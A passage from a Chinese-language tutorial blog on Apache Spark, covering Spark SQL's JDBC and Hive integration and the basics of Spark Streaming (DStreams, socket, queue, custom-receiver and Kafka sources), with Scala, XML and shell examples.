<span class="string">"root"</span>)</span><br><span class="line">                .option(<span class="string">"password"</span>, <span class="string">"123123"</span>)</span><br><span class="line">                .option(<span class="string">"dbtable"</span>, <span class="string">"user"</span>)</span><br><span class="line">                .load()</span><br><span class="line">        <span class="comment">//df.show</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存数据</span></span><br><span class="line">        df.write</span><br><span class="line">                .format(<span class="string">"jdbc"</span>)</span><br><span class="line">                .option(<span class="string">"url"</span>, <span class="string">"jdbc:mysql://hadoop102:3306/spark-sql"</span>)</span><br><span class="line">                .option(<span class="string">"driver"</span>, <span class="string">"com.mysql.jdbc.Driver"</span>)</span><br><span class="line">                .option(<span class="string">"user"</span>, <span class="string">"root"</span>)</span><br><span class="line">                .option(<span class="string">"password"</span>, <span class="string">"123123"</span>)</span><br><span class="line">                .option(<span class="string">"dbtable"</span>, <span class="string">"user1"</span>)</span><br><span class="line">                .mode(<span class="type">SaveMode</span>.<span class="type">Append</span>)</span><br><span class="line">                .save()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 关闭环境</span></span><br><span class="line">        spark.close()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-6-Hive">4.6 Hive</h3><p>Apache Hive 是 Hadoop 上的 SQL 引擎，Spark SQL 编译时可以包含 Hive  支持，也可以不包含。包含 Hive 支持的 Spark SQL 可以支持 Hive 表访问、UDF (用户自定义函数)以及 Hive 查询语言(HiveQL/HQL)等。</p><p>若要把 Spark SQL 连接到一个部署好的 Hive  上，必须把 <code>hive-site.xml</code> 复制到Spark 的配置文件目录中(<code>$SPARK_HOME/conf</code>)。即使没有部署好 Hive，Spark SQL 也可以运行。 需要注意的是，如果你没有部署好 Hive，Spark SQL 会在当前的工作目录中创建出自己的 Hive 元数据仓库，叫作 <code>metastore_db</code>。此外，如果你尝试使用 HiveQL 中的<code>CREATE TABLE</code> (并非 <code>CREATE EXTERNAL TABLE</code>)语句来创建表，这些表会被放在你默认的文件系统中的<code> /user/hive/warehouse</code> 目录中(如果你的 classpath 中有配好的<code>hdfs-site.xml</code>，<strong>默认的文件系统就是 HDFS</strong>，否则就是本地文件系统)。<strong>spark-shell 默认是Hive 支持的；代码中是默认不支持的</strong>，需要手动指定（加一个参数即可）</p><p><strong>内嵌的</strong> <strong>HIVE</strong>，如果使用 Spark 内嵌的 Hive, 则什么都不用做, 直接使用即可。Hive 的元数据存储在 derby 中, 默认仓库地址:$<code>SPARK_HOME/spark-warehouse</code>,在实际使用中, 几乎没有任何人会使用内置的 Hive</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spark.sql(<span class="string">"show tables"</span>).show</span><br><span class="line">spark.sql(<span class="string">"create table aa(id int)"</span>)</span><br><span class="line">spark.sql(<span class="string">"load data local inpath 'input/ids.txt' into table aa"</span>)</span><br><span class="line">spark.sql(<span class="string">"select * from aa"</span>).show</span><br></pre></td></tr></table></figure><p><strong>外部的</strong> <strong>HIVE</strong>，如果想连接外部已经部署好的Hive，需要通过以下几个步骤：</p><ul><li>Spark 要接管 Hive 需要把<code>hive-site.xml</code> 拷贝到conf/目录下</li><li>把 Mysql 的驱动 copy 到 jars/目录下</li><li>如果访问不到 hdfs，则需要把<code>core-site.xml</code> 和 <code>hdfs-site.xml</code> 拷贝到 <code>conf/</code>目录下</li><li>重启 spark-shell</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">spark.sql(<span class="string">"show tables"</span>).show</span><br><span class="line"><span class="comment"># Spark SQL CLI 可以很方便的在本地运行Hive 元数据服务以及从命令行执行查询任务。在</span></span><br><span class="line"><span class="comment"># Spark 目录下执行如下命令启动 Spark SQL CLI，直接执行 SQL 语句，类似一Hive 窗口</span></span><br><span class="line">bin/spark-sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># Spark Thrift Server 是Spark 社区基于HiveServer2 实现的一个Thrift 服务。旨在无缝兼容HiveServer2。</span></span><br><span class="line"><span class="comment"># 因为 Spark Thrift Server 的接口和协议都和HiveServer2 完全一致，因此我们部署好 Spark Thrift Server 后，可以直接使用hive 的 beeline 访问Spark Thrift Server 执行相关语句。</span></span><br><span class="line"><span class="comment"># Spark Thrift Server 的目的也只是取代HiveServer2，因此它依旧可以和 Hive Metastore 进行交互，获取到hive 的元数据</span></span><br><span class="line">sbin/start-thriftserver.sh</span><br><span class="line"><span class="comment"># 使用 beeline 连接 Thrift Server</span></span><br><span class="line">bin/beeline -u jdbc:hive2://Hadoop102:10000 -n root</span><br></pre></td></tr></table></figure><p>最后是IDEA操作Hive，首先导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-hive_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hive<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hive-exec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后将<code>hive-site.xml</code> 文件拷贝到项目的 resources 目录中，代码实现，注意：在开发工具中创建数据库默认是在本地仓库，通过参数修改数据库仓库的地址：<code>config(&quot;spark.sql.warehouse.dir&quot;, &quot;hdfs://hadoop102:8020/user/hive/warehouse&quot;)</code></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Spark05_SparkSQL_Hive</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="comment">// 权限问题，此处的 root 改为你们自己的 hadoop 用户名称</span></span><br><span class="line">        <span class="type">System</span>.setProperty(<span class="string">"HADOOP_USER_NAME"</span>, <span class="string">"atguigu"</span>)</span><br><span class="line">        <span class="comment">// TODO 创建SparkSQL的运行环境</span></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"sparkSQL"</span>)</span><br><span class="line">        <span class="keyword">val</span> spark = <span class="type">SparkSession</span>.builder().enableHiveSupport().config(sparkConf).getOrCreate()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用SparkSQL连接外置的Hive</span></span><br><span class="line">        <span class="comment">// 1. 拷贝Hive-size.xml文件到classpath下</span></span><br><span class="line">        <span class="comment">// 2. 启用Hive的支持</span></span><br><span class="line">        <span class="comment">// 3. 增加对应的依赖关系（包含MySQL驱动）</span></span><br><span class="line">        spark.sql(<span class="string">"show tables"</span>).show</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 关闭环境</span></span><br><span class="line">        spark.close()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>四、Spark Streaming</h1><h2 id="1、SparkStreaming-概述">1、SparkStreaming 概述</h2><h3 id="1-1-简介">1.1 简介</h3><p>Spark Streaming 是一个基于 Spark Core 之上的<strong>实时计算框架</strong>，可以从很多数据源消费数据并对数据进行实时的处理，具有高吞吐量和容错能力强等特点。</p><p><img src="http://qnypic.shawncoding.top/blog/202402291816209.png" alt></p><p>和 Spark 基于 RDD 的概念很相似，Spark Streaming 使用离散化流(discretized stream)作为抽象表示，叫作 DStream。DStream 是随时间推移而收到的数据的序列。在内部，每个时间区间收到的数据都作为 RDD 存在，而 DStream 是由这些 RDD 所组成的序列(因此得名“离散化”)。所以简单来将，DStream 就是对 RDD 在实时数据处理场景的一种封装</p><h3 id="1-2-特点">1.2 特点</h3><ul><li>易用，可以像编写离线批处理一样去编写流式程序，支持 java/scala/python 语言</li><li>容错，SparkStreaming 在没有额外代码和配置的情况下可以恢复丢失的工作</li><li><strong>易整合到 Spark 体系</strong>，流式处理与批处理和交互式查询相结合</li></ul><h3 id="1-3-整体流程">1.3 整体流程</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291816210.png" alt></p><p>Spark Streaming 中，会有一个接收器组件 Receiver，作为一个长期运行的 task 跑在一个 Executor 上。Receiver 接收外部的数据流形成 input DStream。</p><p>DStream 会被按照时间间隔划分成一批一批的 RDD，当批处理间隔缩短到秒级时，便可以用于处理实时数据流。时间间隔的大小可以由参数指定，一般设在 500 毫秒到几秒之间。对 DStream 进行操作就是对 RDD 进行操作，计算处理的结果可以传给外部系统。Spark Streaming 接受到实时数据后，给数据分批次，然后传给 Spark Engine 处理最后生成该批次的结果。</p><h3 id="1-4-数据抽象">1.4 数据抽象</h3><p>这里使用 netcat 工具向 9999 端口不断的发送数据，通过 SparkStreaming 读取端口数据并统计不同单词出现的次数，首先添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-streaming_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写demo代码</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming01_WordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 创建环境对象</span></span><br><span class="line">        <span class="comment">// StreamingContext创建时，需要传递两个参数</span></span><br><span class="line">        <span class="comment">// 第一个参数表示环境配置</span></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="comment">// 第二个参数表示批量处理的周期（采集周期）</span></span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 逻辑处理</span></span><br><span class="line">        <span class="comment">// 获取端口数据</span></span><br><span class="line">        <span class="keyword">val</span> lines: <span class="type">ReceiverInputDStream</span>[<span class="type">String</span>] = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> words = lines.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> wordToOne = words.map((_,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> wordToCount: <span class="type">DStream</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = wordToOne.reduceByKey(_+_)</span><br><span class="line"></span><br><span class="line">        wordToCount.print()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 由于SparkStreaming采集器是长期执行的任务，所以不能直接关闭</span></span><br><span class="line">        <span class="comment">// 如果main方法执行完毕，应用程序也会自动结束。所以不能让main执行完毕</span></span><br><span class="line">        <span class="comment">//ssc.stop()</span></span><br><span class="line">        <span class="comment">// 1. 启动采集器</span></span><br><span class="line">        ssc.start()</span><br><span class="line">        <span class="comment">// 2. 等待采集器的关闭</span></span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动程序并通过netcat 发送数据</span></span><br><span class="line"><span class="comment">// nc -lk 9999 </span></span><br><span class="line"><span class="comment">// hello spark</span></span><br></pre></td></tr></table></figure><p>Spark Streaming 的基础抽象是 DStream(Discretized Stream，离散化数据流，连续不断的数据流)，代表持续性的数据流和经过各种 Spark 算子操作后的结果数据流</p><ul><li>DStream 本质上就是一系列时间上连续的 RDD</li><li>对 DStream 的数据的进行操作也是按照 RDD 为单位来进行的</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202402291816211.png" alt></p><ul><li>容错性，底层 RDD 之间存在依赖关系，DStream 直接也有依赖关系，RDD 具有容错性，那么 DStream 也具有容错性</li><li>准实时性/近实时性，Spark Streaming 将流式计算分解成多个 Spark Job，对于每一时间段数据的处理都会经过 Spark DAG 图分解以及 Spark 的任务集的调度过程。对于目前版本的 Spark Streaming 而言，其最小的 Batch Size 的选取在 0.5~5 秒钟之间</li></ul><h2 id="2、DStream-相关操作">2、DStream 相关操作</h2><h3 id="2-1-DStream-创建">2.1  DStream 创建</h3><p><strong>RDD队列</strong></p><p>测试过程中，可以通过使用 ssc.queueStream(queueOfRDDs)来创建 DStream，每一个推送到这个队列中的RDD，都会作为一个DStream 处理</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming02_Queue</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 创建环境对象</span></span><br><span class="line">        <span class="comment">// StreamingContext创建时，需要传递两个参数</span></span><br><span class="line">        <span class="comment">// 第一个参数表示环境配置</span></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="comment">// 第二个参数表示批量处理的周期（采集周期）</span></span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> rddQueue = <span class="keyword">new</span> mutable.<span class="type">Queue</span>[<span class="type">RDD</span>[<span class="type">Int</span>]]()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> inputStream = ssc.queueStream(rddQueue,oneAtATime = <span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">val</span> mappedStream = inputStream.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> reducedStream = mappedStream.reduceByKey(_ + _)</span><br><span class="line">        reducedStream.print()</span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i &lt;- <span class="number">1</span> to <span class="number">5</span>) &#123;</span><br><span class="line">            rddQueue += ssc.sparkContext.makeRDD(<span class="number">1</span> to <span class="number">300</span>, <span class="number">10</span>)</span><br><span class="line">            <span class="type">Thread</span>.sleep(<span class="number">2000</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>自定义数据源</strong></p><p>需要继承Receiver，并实现 onStart、onStop 方法来自定义数据源采集</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming03_DIY</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> messageDS: <span class="type">ReceiverInputDStream</span>[<span class="type">String</span>] = ssc.receiverStream(<span class="keyword">new</span> <span class="type">MyReceiver</span>())</span><br><span class="line">        messageDS.print()</span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    自定义数据采集器</span></span><br><span class="line"><span class="comment">    1. 继承Receiver，定义泛型, 传递参数</span></span><br><span class="line"><span class="comment">    2. 重写方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyReceiver</span> <span class="keyword">extends</span> <span class="title">Receiver</span>[<span class="type">String</span>](<span class="params"><span class="type">StorageLevel</span>.<span class="type">MEMORY_ONLY</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">var</span> flg = <span class="literal">true</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">onStart</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="type">Thread</span>(<span class="keyword">new</span> <span class="type">Runnable</span> &#123;</span><br><span class="line">                <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">run</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">                    <span class="keyword">while</span> ( flg ) &#123;</span><br><span class="line">                        <span class="keyword">val</span> message = <span class="string">"采集的数据为："</span> + <span class="keyword">new</span> <span class="type">Random</span>().nextInt(<span class="number">10</span>).toString</span><br><span class="line">                        store(message)</span><br><span class="line">                        <span class="type">Thread</span>.sleep(<span class="number">500</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">onStop</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">            flg = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Kafka 数据源（面试、开发重点）</strong></p><p>ReceiverAPI：需要一个专门的Executor 去接收数据，然后发送给其他的 Executor 做计算。存在的问题，接收数据的Executor 和计算的Executor 速度会有所不同，特别在接收数据的Executor 速度大于计算的Executor 速度，会导致计算数据的节点内存溢出。早期版本中提供此方式，当前版本不适用</p><p>DirectAPI：是由计算的Executor 来主动消费Kafka 的数据，速度由自身控制，这里只讲这个模式，首先导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-streaming-kafka-0-10_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写代码</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming04_Kafka</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> kafkaPara: <span class="type">Map</span>[<span class="type">String</span>, <span class="type">Object</span>] = <span class="type">Map</span>[<span class="type">String</span>, <span class="type">Object</span>](</span><br><span class="line">            <span class="type">ConsumerConfig</span>.<span class="type">BOOTSTRAP_SERVERS_CONFIG</span> -&gt; <span class="string">"hadoop102:9092,hadoop103:9092,hadoop104:9092"</span>,</span><br><span class="line">            <span class="type">ConsumerConfig</span>.<span class="type">GROUP_ID_CONFIG</span> -&gt; <span class="string">"atguigu"</span>,</span><br><span class="line">            <span class="string">"key.deserializer"</span> -&gt; <span class="string">"org.apache.kafka.common.serialization.StringDeserializer"</span>,</span><br><span class="line">            <span class="string">"value.deserializer"</span> -&gt; <span class="string">"org.apache.kafka.common.serialization.StringDeserializer"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> kafkaDataDS: <span class="type">InputDStream</span>[<span class="type">ConsumerRecord</span>[<span class="type">String</span>, <span class="type">String</span>]] = <span class="type">KafkaUtils</span>.createDirectStream[<span class="type">String</span>, <span class="type">String</span>](</span><br><span class="line">            ssc,</span><br><span class="line">            <span class="type">LocationStrategies</span>.<span class="type">PreferConsistent</span>,</span><br><span class="line">            <span class="type">ConsumerStrategies</span>.<span class="type">Subscribe</span>[<span class="type">String</span>, <span class="type">String</span>](<span class="type">Set</span>(<span class="string">"atguiguNew"</span>), kafkaPara)</span><br><span class="line">        )</span><br><span class="line">        kafkaDataDS.map(_.value()).print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看Kafka 消费进度</span></span><br><span class="line"><span class="comment">// bin/kafka-consumer-groups.sh --describe --bootstrap-server hadoop102:9092 --group atguigu</span></span><br></pre></td></tr></table></figure><h3 id="2-2-DStream-转换">2.2 DStream 转换</h3><p><strong>无状态转化操作</strong></p><p>无状态转化操作就是把简单的RDD 转化操作应用到每个批次上，也就是转化DStream 中的每一个RDD，即每个批次的处理不依赖于之前批次的数据</p><table><thead><tr><th><strong>Transformation</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>map(func)</td><td>对 DStream 中的各个元素进行 func 函数操作，然后返回一个新的 DStream</td></tr><tr><td>flatMap(func)</td><td>与 map 方法类似，只不过各个输入项可以被输出为零个或多个输出项</td></tr><tr><td>filter(func)</td><td>过滤出所有函数 func 返回值为 true 的 DStream 元素并返回一个新的 DStream</td></tr><tr><td>union(otherStream)</td><td>将源 DStream 和输入参数为 otherDStream 的元素合并，并返回一个新的 